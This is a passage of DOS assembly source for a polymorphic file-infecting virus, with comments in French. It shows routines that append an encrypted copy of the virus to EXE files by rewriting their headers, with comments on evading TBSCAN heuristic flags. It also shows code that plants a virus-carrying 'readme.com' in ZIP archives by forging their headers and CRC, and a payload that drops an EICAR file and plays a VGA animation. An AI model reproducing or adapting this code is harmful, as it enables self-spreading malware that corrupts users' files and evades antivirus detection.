   ret

   set_timedate:
   mov cx, cs:[f_time-start_virus]         ;recup time/date de la memoire
   mov dx, cs:[f_date-start_virus]
   push 5701h                             ;int 57, fc 01=changement time/date
   pop ax                                 ;evite le flag F de TBSCAN
   int 21h                                ;go!

   pointeur_debut:
   mov ax, 4200h                                  ;pointeur au
   push ax
   pop ax
   xor cx, cx                                     ;debut du
   xor dx, dx                                     ;fichier sur le disque
   int 21h                                        ;go!
   ret

   pointeur_fin:
   mov ax, 4202h                               ;pointeur a
   push ax
   pop ax
   xor cx, cx                                  ;la fin du
   xor dx, dx                                  ;fichier sur le disque
   int 21h                                     ;go! retour: taille dans ax
   ret

   write_file:
   push 4000h
   pop ax

   int 21h
   ret

   create_file:
   mov ah,3ch
   xor cx,cx
   int 21h
   ret

   erase_file:
   mov ah, 41h
   int 21h
   ret

   read_file:
   mov ax, 3F00h
   int 21h
   ret

   open_file:
   mov ax, 3D02h                           ;ouverture
   int 21h
   ret

   close_file:
   mov ah, 3Eh
   int 21h
   ret

   nouvelle_int_24:                ;c'est ici que se brancheront les appels
   nop
   nop
   sti
   mov al, 3
   iret
   ip_24 dw ?
   cs_24 dw ?

   push_all:
   pop cs:[offset push_all_tmp-start_virus]
   pushf
   push ax
   push bx
   push cx
   push dx
   push si
   push di
   push es
   push ds
   push bp
   push cs:[offset push_all_tmp-start_virus]
   ret

   pop_all:
   pop cs:[offset push_all_tmp-start_virus]
   pop bp
   pop ds
   pop es
   pop di
   pop si
   pop dx
   pop cx
   pop bx
   pop ax
   popf
   push cs:[offset push_all_tmp-start_virus]
   ret

   annuler_registres:
   xor ax, ax
   xor bx, bx
   xor cx, cx
   xor dx, dx
   xor di, di
   xor si, si
   xor bp, bp
   ret

   process_exe1_from_resident:
   push bp
   mov bp, offset start_virus
   neg bp
   jmp process_exe1

   process_exe1_from_runtime:
   push bp

   process_exe1:
   ;----------------sauve valeurs du header-------------------------
   lea di, [bp+offset vIP]
   mov ax, word ptr cs:[bp+exehead+14h]
   stosw
   mov ax, word ptr cs:[bp+exehead+16h]
   stosw
   mov ax, word ptr cs:[bp+exehead+0Eh]
   stosw
   mov ax, word ptr cs:[bp+exehead+10h]
   stosw
   ;---------pointeur fin du fichier disk (retourne dx:ax = taille)---------

   call pointeur_fin
   mov cx, ax
   or al, 0fh      ;ajustement de la taille au paragraphe
   add ax, 1       ;sup pour que l'IP de départ soit 0
   adc dx, 0
   push ax                               ;on sauve la taille
   push dx
   ;----------------calcule nouveau cs:ip---------------------------------
   push ax
   sub ax, cx
   mov byte ptr cs:[bp+ajuste_exe], al
   mov ax, word ptr cs:[bp+exehead+08h]
   mov cl, 4
   shl ax, cl
   mov cx, ax
   pop ax
   sub ax, cx
   sbb dx, 0
   mov cl, 0Ch
   shl dx, cl
   mov cl, 4
   push ax
   shr ax, cl
   add dx, ax
   shl ax, cl
   pop cx
   sub cx, ax
   mov  word ptr cs:[bp+exehead+14h], cx           ;valeurs transformees
   mov  word ptr cs:[bp+exehead+16h], dx           ;stock‚es dans la zone header
   inc dx                                                   ;evite flag K !!
   mov  word ptr cs:[bp+exehead+0Eh], dx           ;en m‚moire
   mov  word ptr cs:[bp+exehead+10h], 1F00h    ;plus grand sans flag
   ;-----------------calcule nouvelle taille---------------------------
   pop dx
   pop ax
   push ax         ;on en a besoin un peu plus loin pour
   push dx         ;l'ajustement du pointeur disque
   push ax
   add ax, endvirus-start_virus
   adc dx, 0
   mov cl, 7
   shl dx, cl
   mov cl, 9
   shr ax, cl
   add ax, dx
   inc ax
   mov word ptr cs:[bp+exehead+04h], ax
   pop ax
   add ax, endvirus-start_virus
   and ah, 1
   mov word ptr cs:[bp+exehead+02h], ax
   ;----------------ecrit signature----------------------------------
   mov word ptr cs:[bp+exehead+12h], "i"
   ;-------------ecrit header et virus sur le disque------------------
   mov ax, 4200h                   ;pointeur à partir du début du fichier
   pop cx                          ;en ajoutant la taille ajustée au paragraphe
   pop dx                          ;supérieur, pour avoir IP de départ = 0
   int 21h                         ;go!

   xor ax, ax
   mov cs:[bp+offset taille_fse], ax
   mov byte ptr cs:[bp+offset com_fse], 0
   mov byte ptr cs:[bp+offset marqueur_inf], 1
   pop bp
   ret

   process_exe2_from_resident:
   push bp
   mov bp, offset start_virus
   neg bp
   jmp process_exe2

   process_exe2_from_runtime:
   push bp

   process_exe2:
   ;---ecriture du corps crypté dans le nouveau fichier---------
   mov bx, word ptr cs:[bp+offset f_handle]
   lea dx, [bp+offset heap]
   call write_file
   add cl, byte ptr cs:[bp+offset ajuste_exe]
   adc ch, 0
   mov word ptr cs:[bp+offset size_for_stealth], cx

   call pointeur_debut

   mov cx, 1ch                                    ;des 28 premiers octets
   lea dx, [bp+offset exehead]             ;stockes dans cette zone
   call write_file
   pop bp
   ret

   ;************************************************************
   ;*********** INFECTION DES ZIP ***********************
   ;************************************************************

   infecte_zip_from_w95:
   call push_all
   push cs
   pop es
   xor al, al
   stosb
   jmp evite_recherche_du_nom

   infecte_zip_from_dos:
   call push_all

   ;----------------get full zip file name from FCB-----------------
   push es
   pop ds
   mov si, bx
   inc si
   push cs
   pop es
   mov di, offset buffer_name-start_virus
   mov cx, 8
   get_first_name_part:
   lodsb
   cmp al, 20h
   je end_name
   stosb
   loop get_first_name_part
   end_name:
   mov al, "."
   stosb
   mov ax, "IZ"
   stosw
   mov al, "P"
   mov ah, 0
   stosw

   evite_recherche_du_nom:
   push cs
   pop ds

   ;-----------create readme.com on disk--------------------

   call rnd_get
   cmp ah, 42
   jb add1
   cmp ah, 84
   jb add2
   cmp ah, 126
   jb add3
   jmp end_zip_infect

   add3:   ;route
   mov cs:[taille_fse-start_virus], 100h + file_add_size3
   mov dx, offset file_add_content3-start_virus
   push dx
   jmp suite_readme
   add2:   ;defile
   mov cs:[taille_fse-start_virus], 100h + file_add_size2
   mov dx, offset file_add_content2-start_virus
   push dx
   jmp suite_readme
   add1:   ;etoiles
   mov cs:[taille_fse-start_virus], 100h + file_add_size1
   mov dx, offset file_add_content1-start_virus
   push dx

   suite_readme:
   mov word ptr cs:[offset contenu-start_virus], 13B0h     ;fake original add_file starting 4 bytes
   mov word ptr cs:[offset contenu+2-start_virus], 10CDh   ;they all have the same

   mov byte ptr cs:[com_fse-start_virus], 1
   CALL POLY_FROM_RESIDENT
   mov word ptr cs:[virus_zip_size-start_virus], cx

   create_temp_add_file:
   mov dx, offset file_add-start_virus
   call create_file
   xchg ax, bx
   mov word ptr cs:[file_add_handle-start_virus], bx

   write_temp_add_file_content:
   sub word ptr cs:[taille_fse-start_virus], 100h;a partir de now, taille_fse sert a stocker file_add_size
   mov cx, word ptr cs:[taille_fse-start_virus]
   pop dx
   call write_file

   write_virus_to_temp_add_file:
   mov cx, word ptr cs:[virus_zip_size-start_virus]
   mov dx, offset heap-start_virus
   call write_file

   pointer_to_start_of_temp_add_file:
   call pointeur_debut

   ;--------------------------calcule CRC---------------------------

   push bp
   mov bp, offset heap-start_virus

   c_crc32:
           push    cs
           pop     es
           push    di
           mov     word ptr cs:[zip_crc_32-start_virus],0ffffh
           mov     word ptr cs:[zip_crc_32+2-start_virus],0ffffh

           call    gentable

   read_next:
           mov     cx,200h                         ; !!!!
           mov     dx,bp
           add     dx,1024
           mov     bx,word ptr cs:[file_add_handle-start_virus]
       call read_file
           mov     cx,ax
           or      cx,cx
           je      crc32_ret
           mov     si,bp
           add     si,1024
           call    calc_crc32
           jmp     short read_next

   crc32_ret:
           not     word ptr cs:[zip_crc_32-start_virus]
           not     word ptr cs:[zip_crc_32+2-start_virus]
           pop     di
            jmp fin_crc

   calc_crc32:
           push    es
           les     ax,dword ptr cs:[zip_crc_32-start_virus]
           mov     dx,es
   c_crc:
           xor     bh,bh
           mov     bl,al
           lodsb
           xor     bl,al
           mov     al,ah
           mov     ah,dl
           mov     dl,dh
           xor     dh,dh
           shl     bx,1
           shl     bx,1
           push    di
           mov     di,bp
           les     bx,dword ptr cs:[di+bx]
           pop     di
           xor     ax,bx
           mov     bx,es
           xor     dx,bx
           loop    c_crc
           mov     word ptr cs:[zip_crc_32-start_virus],ax
           mov     word ptr cs:[zip_crc_32+2-start_virus],dx
           pop     es
           ret

   ; bp - where make table
   gentable:
           push    cs
           pop     es
           mov     di,bp
           xor     cx,cx
   gentab_1:
           xor     ax,ax
           xor     dx,dx
           mov     al,cl
           push    cx
           mov     cx,8
   gentab_2:
           clc
           rcr     dx,1
           rcr     ax,1
           jnb     gentab_3
           xor     dx,0edb8h
           xor     ax,8320h
   gentab_3:
           loop    gentab_2
           mov     word ptr es:[di],ax
           mov     word ptr es:[di+2],dx
           add     di,4
           pop     cx
           inc     cx
           cmp     cx,100h
           jnz     gentab_1
           ret

   fin_crc:
   pop bp

   put_crc_in_second_location:
   mov ax, word ptr cs:[zip_crc_32-start_virus]
   mov word ptr cs:[zip_crc_32_-start_virus], ax
   mov ax, word ptr cs:[zip_crc_32+2-start_virus]
   mov word ptr cs:[zip_crc_32_+2-start_virus], ax

   ;--------analyse zip file, save central dir and end header---------------

   mov dx, offset buffer_name-start_virus
   call open_file
   jnc open_ok
   jmp end_zip_infect
   open_ok:
   xchg bx, ax
   mov word ptr cs:[zip_handle-start_virus], bx

   call recup_timedate
   mov byte ptr cs:[offset number_of_entries-start_virus], 130     ;compteur de fichiers inside zip

   read_local_hdr:
   dec byte ptr cs:[offset number_of_entries-start_virus]
   jz close_add
   mov cx, 4
   mov dx, offset heap-start_virus
   call read_file
   cmp word ptr cs:[offset heap-start_virus],"KP"
   je zipsign_ok
   jmp end_zip_infect

   zipsign_ok:
   cmp word ptr cs:[offset heap+2-start_virus],0403h
   je read_local_hdr_struc
   jmp we_are_in_the_central_dir

   read_local_hdr_struc:
   mov cx, 1eh-4+10
   mov dx, offset heap+4-start_virus
   call read_file

   verify_if_infected:
   mov cx, 10
   mov di, offset heap+1Eh-start_virus
   mov si, offset zip_filename-start_virus
   repe cmpsb
   jz close_add
   jmp find_next_local_hdr

   close_add:
   mov bx, word ptr cs:[file_add_handle-start_virus]
   call close_file

   erase_add:
   mov dx, offset file_add-start_virus
   call erase_file
   jmp close_new_zip

   find_next_local_hdr:
   mov dx, word ptr cs:[offset heap+12h-start_virus]       ;zip_compressed_size
   mov cx, word ptr cs:[offset heap+14h-start_virus]       ;
   mov ax, word ptr cs:[offset heap+1Ch-start_virus]       ;zip_extra_field_length
   add dx, ax
   adc cx, 0
   mov ax, word ptr cs:[offset heap+1Ah-start_virus]       ;zip_size_fname
   add dx, ax
   sub dx, 10d
   adc cx, 0
   mov ax,4201h
   int 21h
   jmp read_local_hdr

   we_are_in_the_central_dir:
   create_dir_file:
   mov dx, offset file_dir-start_virus
   call create_file
   mov word ptr cs:[file_dir_handle-start_virus], ax
   jnc read_central_dir
   jmp fin

   read_central_dir:
   mov bx, word ptr cs:[zip_handle-start_virus]
   mov cx, 2eh-4
   mov dx, offset heap+4-start_virus
   call read_file

   read_dir_entry_struc:
   mov cx, word ptr cs:[offset heap+1Ch-start_virus]       ;zip_size_fname
   add cx, word ptr cs:[offset heap+1Eh-start_virus]       ;zip_extra_field_length
   add cx, word ptr cs:[offset heap+20h-start_virus]       ;zip_file_comment_length
   mov dx, offset heap+2Eh-start_virus
   call read_file

   write_all_dir_entry:
   mov bx, word ptr cs:[file_dir_handle-start_virus]
   mov dx, offset heap-start_virus
   add cx, 2eh
   call write_file

   read_next_dir_entry:
   mov bx, word ptr cs:[zip_handle-start_virus]
   mov cx, 4
   call read_file

   cmp word ptr cs:[offset heap-start_virus],"KP"
   je zipsign_ok2
   jmp end_zip_infect

   zipsign_ok2:
   cmp word ptr cs:[offset heap+2-start_virus],0605h
   je we_are_in_the_end_hdr
   jmp read_central_dir

   we_are_in_the_end_hdr:
   create_end_file:
   mov dx, offset file_end-start_virus
   call create_file
   mov word ptr cs:[file_end_handle-start_virus], ax
   jnc read_end_dir
   jmp end_zip_infect

   read_end_dir:
   mov bx, word ptr cs:[zip_handle-start_virus]
   mov cx, 16h-4
   mov dx, offset heap+4-start_virus
   call read_file

   read_end_dir_struct:
   mov cx, word ptr cs:[offset heap+14h-start_virus]       ;zipfile_comment_length
   mov bx, word ptr cs:[zip_handle-start_virus]
   mov dx, offset heap+16h-start_virus
   call read_file

   write_end_dir_struct:
   mov bx, word ptr cs:[file_end_handle-start_virus]
   mov dx, offset heap-start_virus
   add cx, 16h
   mov word ptr cs:[end_file_size-start_virus], cx         ;sauve end_file size
   call write_file

   pointer_to_start_of_central_dir:
   mov dx, word ptr cs:[offset heap+10h-start_virus]       ;offset of central dir
   mov cx, word ptr cs:[offset heap+12h-start_virus]
   mov word ptr cs:[offset zip_rel_off_of_loc_hdr_-start_virus], dx
   mov word ptr cs:[offset zip_rel_off_of_loc_hdr_+2-start_virus], cx
   mov bx, word ptr cs:[zip_handle-start_virus]
   mov ax,4200h
   int 21h

   ;-------------write virus in principal zip part-------------------------

   change_some_things_in_local_header:
   mov cx, word ptr cs:[virus_zip_size-start_virus]
   add cx, word ptr cs:[taille_fse-start_virus]
   mov word ptr cs:[offset zip_compressed_size-start_virus], cx
   mov word ptr cs:[offset zip_uncompressed_size-start_virus], cx

   write_add_file_local_hdr:
   mov bx, word ptr cs:[zip_handle-start_virus]
   mov dx, offset zip_local_header_struc-start_virus
   mov cx, 1Eh+10d
   call write_file

   pointer_to_start_of_add_file:
   mov bx, word ptr cs:[file_add_handle-start_virus]
   call pointeur_debut

   read_add_file:
   mov dx, offset heap-start_virus
   mov cx, word ptr cs:[virus_zip_size-start_virus]
   add cx, word ptr cs:[taille_fse-start_virus]
   call read_file

   write_virus_to_zip:
   mov bx, word ptr cs:[zip_handle-start_virus]
   mov cx, word ptr cs:[virus_zip_size-start_virus]
   add cx, word ptr cs:[taille_fse-start_virus]
   call write_file

   close_temp_add_file:
   mov bx, word ptr cs:[file_add_handle-start_virus]
   call close_file

   erase_temp_add_file:
   mov dx, offset file_add-start_virus
   call erase_file

   ;-------------write modified dir part-------------------------

   pointer_to_end_of_dir_file:
   mov bx, word ptr cs:[file_dir_handle-start_virus]
   call pointeur_fin
   push ax                                                 ;save size

   change_some_things_in_dir_header:
   mov cx, word ptr cs:[virus_zip_size-start_virus]
   add cx, word ptr cs:[taille_fse-start_virus]
   mov word ptr cs:[offset zip_compressed_size_-start_virus], cx
   mov word ptr cs:[offset zip_uncompressed_size_-start_virus], cx

   write_ta_mere_dir_hdr:
   mov dx, offset zip_central_header_struc-start_virus
   mov cx, 2Eh+10d
   call write_file

   ;-------------merge dir part with principal zip part-------------------------

   read_dir_file_size:
   pop ax
   add ax, 2Eh+10d
   mov word ptr cs:[dir_file_size-start_virus], ax

   pointer_to_start_of_dir_file:
   call pointeur_debut

   read_dir_file:
   mov dx, offset heap-start_virus
   mov cx, word ptr cs:[dir_file_size-start_virus]
   call read_file

   merge_dir_with_zip:
   mov bx, word ptr cs:[zip_handle-start_virus]
   call write_file

   close_dir_file:
   mov bx, word ptr cs:[file_dir_handle-start_virus]
   call close_file

   erase_dir_file:
   mov dx, offset file_dir-start_virus
   call erase_file

   ;-------------write modified end part to the end of principal+dir part-------------------------

   pointer_to_start_of_end_file:
   mov bx, word ptr cs:[file_end_handle-start_virus]
   call pointeur_debut

   read_end_file:
   mov dx, offset heap-start_virus
   mov cx, word ptr cs:[end_file_size-start_virus]
   call read_file

   change_some_things_in_end_hdr:
   inc word ptr cs:[offset heap+8-start_virus]             ;ttl_num_of_ent_on_this_disk
   inc word ptr cs:[offset heap+0Ah-start_virus]           ;ttl_num_of_ent_in_the_cent_dir
   add word ptr cs:[offset heap+0Ch-start_virus], 2Eh+10d  ;size_of_the_central_directory
   adc word ptr cs:[offset heap+0Ch+2-start_virus], 0
   mov cx, 1Eh+10d
   add cx, word ptr cs:[taille_fse-start_virus]
   add cx, word ptr cs:[virus_zip_size-start_virus]
   add word ptr cs:[offset heap+10h-start_virus], cx               ;off_of_strt_of_cent_directory
   adc word ptr cs:[offset heap+10h+2-start_virus], 0

   merge_end_with_zip:
   mov cx, word ptr cs:[end_file_size-start_virus]
   mov bx, word ptr cs:[zip_handle-start_virus]
   call write_file

   close_end_file:
   mov bx, word ptr cs:[file_end_handle-start_virus]
   call close_file

   erase_end_file:
   mov dx, offset file_end-start_virus
   call erase_file

   close_new_zip:
   mov bx, word ptr cs:[zip_handle-start_virus]
   call set_timedate
   call close_file

   end_zip_infect:
   call pop_all
   ret

   zip_local_header_struc:

   zip_loc_sign                         db     "PK",3,4 ;  0
   zip_ver_ned_to_extr                  db     0Ah,0    ;  4
   zip_flags                            db     0,0      ;  6
   zip_compression_method               db     0,0      ;  8
   zip_file_time                        db     66h,8eh  ;  A
   zip_file_date                        db     37h,23h  ;  C
   zip_crc_32                           dd     ?        ;  E
   zip_compressed_size                  db     50d,0,0,0; 12
   zip_uncompressed_size                db     50d,0,0,0; 16
   zip_size_fname                       db     10d,0    ; 1A
   zip_extra_field_length               db     0,0      ; 1C
   zip_filename                   db "readme.com"     ; 1E

   zip_central_header_struc:

   zip_centr_sign_                      db     "PK", 1,2;  0
   zip_ver_made_by_                     db     14,0     ;  4
   zip_ver_ned_to_extr_                 db     0Ah,0    ;  6
   zip_flags_                           db     0,0      ;  8
   zip_compression_method_              db     0,0      ;  A
   zip_file_time_                       db     66h,8eh  ;  C
   zip_file_date_                       db     37h,23h  ;  E
   zip_crc_32_                          dd     ?        ; 10
   zip_compressed_size_                 db     50d,0,0,0; 14
   zip_uncompressed_size_               db     50d,0,0,0; 18
   zip_size_fname_                      db     10d,0    ; 1C
   zip_extra_field_length_              db     0,0      ; 1E
   zip_file_comment_length_             db     0,0      ; 20
   zip_disk_number_start_               db     0,0      ; 22
   zip_intrnl_file_attr_                db     0,0      ; 24
   zip_extrnl_file_attr_                db     0,0,0,0  ; 26
   zip_rel_off_of_loc_hdr_              dd     ?        ; 2A
   zip_filename_              db "readme.com"         ; 2E

   file_dir db "dir.ska",0
   file_end db "end.ska",0
   file_add db "add.ska",0
   zip_handle dw "h1"
   file_dir_handle dw "h2"
   file_end_handle dw "h3"
   file_add_handle dw "h5"
   dir_file_size dw "sz"
   end_file_size dw "sz"
   virus_zip_size dw ?
   number_of_entries db 0
   buffer_name db 13d dup ("b")

   file_add_content1:      ;etoiles
   db 0E9h, 0ADh, 0,69h            ;jmp to virus+sig
      ;          DB 0B0H,013H,0CDH,010h
        DB 050H,0BAH,00DH,00AH,0B4H,002H
            DB 0CDH,010H,0BEH,084H,001H,0B1H,00FH,0E8H,066H,000H
            DB 0BAH,006H,00CH,0B4H,002H,0CDH,010H,0B1H,01DH,0E8H
            DB 05AH,000H,0BFH,0B0H,001H,0B9H,0B0H,004H,058H,0B6H
            DB 084H,0F7H,0E2H,040H,050H,0ABH,08AH,0C2H,024H,003H
            DB 0FEH,0C0H,0AAH,0E2H,0EFH,0B8H,000H,0A0H,08EH,0C0H
            DB 0BAH,0DAH,003H,0ECH,0A8H,008H,074H,0FBH,0BEH,0B0H
            DB 001H,0B9H,0B0H,004H,0ADH,08BH,0F8H,032H,0E4H,0ACH
            DB 057H,0BBH,040H,001H,0F7H,0E3H,05BH,003H,0D8H,089H
            DB 05CH,0FDH,026H,080H,025H,0F0H,08AH,0C1H,024H,00FH
            DB 026H,008H,007H,0E2H,0E1H,0E4H,060H,03CH,001H,074H
            DB 002H,0EBH,0CBH,0B8H,003H,000H,0CDH,010H,0B4H,04CH
            DB 0CDH,021H,0ACH,0B3H,060H,0B4H,00EH,0CDH,010H,0E2H
            DB 0F7H,0C3H,044H,06FH,077H,06EH,06CH,06FH,061H,064H
            DB 065H,064H,020H,046H,072H,06FH,06DH,068H,074H,074H
            DB 070H,03AH,02FH,02FH,077H,077H,077H,02EH,06EH,061H
            DB 072H,06BH,06FH,074H,069H,063H,02EH,063H,06FH,06DH
            DB 02FH,07EH,076H,069H,063H,06FH
   file_add_size1 equ $ - offset file_add_content1

   file_add_content2:      ;defile
   db 0E9h, 0DAh,0,69h
     ;           DB 0B0H,013H,0CDH,010H,
        DB 0BDH,000H,001H,0FAH,0BAH,0DAH
            DB 003H,0ECH,0A8H,008H,074H,0FBH,0B8H,000H,0A0H,08EH
            DB 0C0H,08EH,0D8H,0B1H,009H,0BBH,002H,064H,051H,08BH
            DB 0F3H,083H,0C6H,004H,08BH,0FBH,0B1H,09FH,0F3H,0A5H
            DB 081H,0C3H,000H,005H,059H,0E2H,0EDH,033H,0F6H,02EH
            DB 08EH,006H,0D9H,001H,0BBH,06EH,0FAH,003H,0DDH,026H
            DB 08AH,000H,02EH,022H,006H,0D8H,001H,074H,015H,0BBH
            DB 03FH,065H,033H,0FFH,081H,0C3H,000H,005H,047H,03BH
            DB 0F7H,07DH,0F7H,08BH,0CEH,080H,0C1H,019H,088H,00FH
            DB 046H,083H,0FEH,008H,075H,0D6H,00EH,01FH,0D0H,00EH
            DB 0D8H,001H,080H,03EH,0D8H,001H,080H,075H,01CH,0FFH
            DB 006H,0DBH,001H,08BH,036H,0DBH,001H,08AH,084H,09CH
            DB 001H,03CH,000H,075H,006H,031H,036H,0DBH,001H,0EBH
            DB 0EAH,0B3H,008H,0F6H,0E3H,08BH,0E8H,0E4H,060H,03CH
            DB 001H,074H,003H,0E9H,076H,0FFH,0FBH,0B8H,003H,000H
            DB 0CDH,010H,0B4H,04CH,0CDH,021H,020H,044H,061H,020H
            DB 042H,065H,053H,074H,020H,042H,06FH,061H,052H,064H
            DB 020H,049H,06EH,020H,053H,050H,061H,069H,04EH,03AH
            DB 020H,045H,06CH,020H,047H,072H,069H,04CH,04CH,06FH
            DB 020H,04CH,06FH,063H,06FH,020H,028H,033H,034H,02DH
            DB 031H,02DH,033H,035H,032H,020H,032H,034H,020H,034H
            DB 035H,029H,020H,020H,020H,000H,080H,000H,0F0H,000H
            DB 000H
   file_add_size2 equ $ - offset file_add_content2

   file_add_content3:      ;road
   db 0E9h, 0C4h,0,69h
    ;            DB 0B0H,013H,0CDH,010H,
        DB 032H,0EDH,0BEH,0A3H,001H,0BAH
            DB 00CH,004H,0B4H,002H,0CDH,010H,0B1H,010H,0ACH,0B3H
            DB 004H,0B4H,00EH,0CDH,010H,0E2H,0F7H,0BAH,00AH,006H
            DB 0B4H,002H,0CDH,010H,0B1H,014H,0ACH,0B3H,002H,0B4H
            DB 00EH,0CDH,010H,0E2H,0F7H,068H,000H,0A0H,007H,006H
            DB 01FH,0BFH,040H,0ABH,0B5H,078H,060H,0BBH,07EH,0FAH
            DB 08DH,0B7H,072H,005H,0BDH,0A0H,000H,003H,02FH,02BH
            DB 02EH,020H,0FAH,08DH,00AH,096H,08DH,033H,02BH,0E8H
            DB 06BH,0C0H,0FEH,050H,0B0H,007H,0F3H,0AAH,059H,040H
            DB 0F3H,0AAH,0B9H,040H,001H,02BH,0CDH,048H,042H,0F6H
            DB 0C2H,008H,074H,002H,088H,004H,0F3H,0AAH,080H,0EBH
            DB 002H,075H,0CBH,0BEH,002H,0FAH,0B1H,03FH,0F3H,0A5H
            DB 061H,04AH,052H,0B8H,0D9H,0FFH,0F7H,0E9H,003H,0DAH
            DB 003H,0CBH,08BH,0C1H,0C1H,0F8H,00AH,02DH,01EH,000H
            DB 0A3H,07EH,0FAH,0BAH,0DAH,003H,0ECH,0A8H,008H,074H
            DB 0FBH,05AH,0E4H,060H,098H,048H,075H,09AH,0B0H,003H
            DB 0CDH,010H,0C3H,02AH,020H,052H,04FH,041H,044H,04BH
            DB 049H,04CH,04CH,020H,042H,042H,053H,020H,02AH,043H
            DB 061H,06CH,06CH,020H,06EH,06FH,077H,020H,030H,032H
            DB 038H,02DH,036H,036H,032H,031H,035H,039H,030H
   file_add_size3 equ $ - offset file_add_content3

   ;************************************************************
   ;******************** lacher eicar *****************************
   ;************************************************************

   eicar_file      db "c:\virus.com", 0
   eicar_content    DB 058H,035H,04FH,021H,050H,025H,040H,041H,050H,05BH
           DB 034H,05CH,050H,05AH,058H,035H,034H,028H,050H,05EH
            DB 029H,037H,043H,043H,029H,037H,07DH,024H,045H,049H
            DB 043H,041H,052H,02DH,053H,054H,041H,04EH,044H,041H
           DB 052H,044H,02DH,041H,04EH,054H,049H,056H,049H,052H
            DB 055H,053H,02DH,054H,045H,053H,054H,02DH,046H,049H
           DB 04CH,045H,021H,024H,048H,02BH,048H,02AH

   bombe:
   push cs
   push cs
   pop ds
   pop es

   lea dx, [bp+eicar_file]
   call create_file
   xchg ax, bx
   add dx, 13d
   mov cx, 68d
   call write_file
   call close_file

   ;************************************************************
   ;******************** BOMBE *****************************
   ;************************************************************

   ;----------------initialisation du VGA-----------------------------

   mov ax, 13h            ; Init vga
   int 10h

   ;------------------ajuster la couleur 7 en noir--------------------

   mov dx, 3c8h    ;dx = port d'ecriture de la palette
   mov al, 7
   out dx, al      ;on ecrit la premiere couleur dans le port
   inc dx          ;on passe a la definition des couleurs
   xor al, al
   out dx, al
   out dx, al
   out dx, al

   ;-----------on affiche le message 3D---------------------

   lea dx, [bp+offset message3D]
   mov ah, 9
   int 21h

   ;--------creation de la table des coords x,y pour la 3D--------------

   mov ax, 0A000h  ;ds:si = début vidéo
   mov ds, ax              ;es:di = zone stockage des coords
   push ds
   push es
   push cs

   lea di, [bp+offset heap]
   mov cx, 62*10           ;à partir d'une zone de 10 lignes, 55 colonnes
   xor si, si
   xor dx, dx              ;marqueur de fin de ligne
   xor bx, bx

   table3D:

   lodsb
   or al, al               ;c'est un pixel de la lettre?
   je fin
   mov ax, dx
   sub ax, 70
   stosw                   ;stocker le X
   mov ax, bx
   sub ax, 20
   stosw                   ;stocker le Y
   inc cs:[bp+offset nb_points_3D]

   fin:
   add dx, 3
   cmp dl, 62*3
   jne pas_fin_de_ligne3D  ;si dl=0 on est en fin de ligne
   xor dx, dx              ;dans ce cas, on remet le compteur a 128
   add si, 320-62          ;et on ajuste le pointeur video sur ligne suivante
   add bx, 4
   pas_fin_de_ligne3D:

   loop table3D

   pop ds

   ;-----------on affiche le message 2D---------------------

   lea dx, [bp+offset message2D]
   mov ah, 9
   int 21h

   ;--------------creation de la table des coord 2D-----------------

   pop es
   pop ds

   mov cx, 48*60
   xor si, si
   xor dx, dx
   xor bx, bx

   table2D:

   lodsb
   or al, al
   je fin2
   mov ax, dx
   sub ax, 50
   stosw
   mov ax, bx
   shl ax, 1
   sub ax, 30
   stosw
   inc cs:[bp+offset nb_points_2D]

   fin2:
   inc dx
   inc dx
   cmp dx, 48*2
   jne pas_fin_de_ligne2D  ;si dl=55 on est en fin de ligne
   xor dx, dx              ;dans ce cas, on remet le compteur a 0
   add si, 320-48          ;et on ajuste le pointeur video sur ligne suivante
   inc bx
   pas_fin_de_ligne2D:

   loop table2D

   ;------------------initialiser les segments----------------------
   ;ici ds=vidéo es=cs

   push ds
   pop es
   push cs
   pop ds

   mov word ptr cs:[bp+offset erase3d], di
   mov bx, word ptr cs:[bp+offset nb_points_3D]
   shl bx, 1
   add bx, di
   mov word ptr cs:[bp+offset erase2d], bx

   mainloop:

   ;---------------calculer nouvelle valeur angle/sin/cos----------------

   inc byte ptr cs:[bp+angle]
   mov bl, byte ptr cs:[bp+angle]
   xor bh,bh
   push bx
   add bx, bp
   mov al,byte ptr cs:[bx+SinCos]  ;chope sinus
   cbw
   mov word ptr cs:[bp+sin],ax                     ;sauve sinus
   pop bx
   add bl, 64
   add bx, bp
   mov al,byte ptr cs:[bx+SinCos]  ;chope cosinus
   cbw
   mov word ptr cs:[bp+cos],ax                     ;sauve cosinus

   ;                         ********************
   ;                         **    PARTIE 3D   **
   ;                         ********************

   mov cx, cs:[bp+nb_points_3D]
   push cx
   push cx
   lea si, [bp+offset heap]

   anim3D:

   ;----------mettre les coords x,y,z dans leurs zones mémoire-------------

   lodsw                   ;si = X
   mov word ptr cs:[bp+X],ax
   lodsw                   ;si+1 = Y
   mov word ptr cs:[bp+Y],ax
   mov word ptr cs:[bp+Z],-50

   ;------------------rotation autour de l'axe X---------------------------

   push cx
   push si

   lea si, [bp+offset Y]
   push si
   lea di, [bp+offset Z]
   call rotation

   ;------------------rotation autour de l'axe Y---------------------------

   lea si, [bp+offset x]
   call rotation

   ;------------------rotation autour de l'axe Z---------------------------

   pop di
   call rotation
   pop si

   ; ----------calculer position sur l'ecran, plotter--------------------

   mov ax,256              ;Xoff*X / Z+Zoff = x ecran
   imul word ptr cs:[bp+x]
   mov bx, word ptr cs:[bp+Z]
   add bx,300              ;distance
   idiv bx
   add ax,160              ;centrer les x
   push ax
   mov ax,256              ;Yoff*Y / Z+Zoff = screen y
   imul word ptr cs:[bp+y]
   mov  bx, word ptr cs:[bp+Z]
   add bx,300              ;distance
   idiv bx
   add ax,100              ;centrer les y
   mov bx,320
   imul bx
   pop bx
   add ax,bx               ;ax = (y*320)+x
   mov di,ax
   mov bx, word ptr cs:[bp+offset erase3D]
   pop cx
   push cx
   shl cx, 1
   add bx, cx
   mov word ptr [bx],di       ;sauver offset pour effacer
   mov bx, word ptr cs:[bp+Z]              ;couleur en fonction de la profondeur Z
   mov cl, 4
   shr bx, cl
   pop cx
   mov al,23
   sub al, bl
   mov ah, al

   stosw
   add di, 318
   stosw

   dec cx
   or cx, cx
   je suite12
   jmp anim3D
   suite12:
   ;                    ********************
   ;                    **    PARTIE 2D   **
   ;                    ********************

   pop si
   shl si, 1
   shl si, 1
   lea cx, [bp+offset heap]
   add si, cx
   mov cx, cs:[bp+nb_points_2D]

   anim2D:
   push cx
   lodsw
   imul word ptr cs:[bp+cos]
   mov di, ax
   lodsw
   imul word ptr cs:[bp+sin]
   sub di, ax
   mov cl, 7
   sar di, cl
   add di, 160
   mov bx, di
   sub si, 4
   lodsw
   imul word ptr cs:[bp+sin]
   mov di, ax
   lodsw
   imul word ptr cs:[bp+cos]
